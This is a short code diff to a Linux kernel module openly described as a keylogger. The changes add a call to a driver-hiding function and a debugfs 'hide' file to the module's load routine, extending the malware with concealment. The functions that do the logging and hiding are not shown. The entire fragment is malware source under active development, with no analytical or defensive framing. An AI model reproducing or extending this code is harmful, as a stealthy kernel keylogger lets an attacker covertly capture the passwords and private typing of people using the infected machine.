@@ -5,6 +5,8 @@ MODULE_VERSION("1.0");
 MODULE_DESCRIPTION("Just a simple keylogger");
 MODULE_SUPPORTED_DEVICE("Not machine dependent");
 static struct dentry *file;
+static struct dentry *file1;
+
 static struct dentry *subdir;
 int ret = 0;
 
@@ -14,6 +16,16 @@ static struct notifier_block keylogger ={.notifier_call = notifier};
 static int __init MOD_LOAD(void)
 {
     ret = driver_entry();
+    if (ret == -1)
+    {
+        printk(KERN_ALERT "Keylogger: unbale to load the module -> driver entry");
+        return ret;
+    }
+    else
+    {
+        printk(KERN_ALERT "Keylogger: load the device driver successfully");
+    }
+    ret = hide_driver_entery();
     if (ret == -1)
     {
         printk(KERN_ALERT "Keylogger: unbale to load the module -> driver entry");
@@ -41,6 +53,13 @@ static int __init MOD_LOAD(void)
         debugfs_remove_recursive(subdir);
         return -ENOENT;
     }
+    file1 = debugfs_create_file("hide",0500, subdir, NULL, &hide);
+    if (!file1)
+    {
+        debugfs_remove_recursive(subdir);
+        return -ENOENT;
+    }
+    
     else
     {
         printk(KERN_ALERT "Keylogger: create debugfs file");
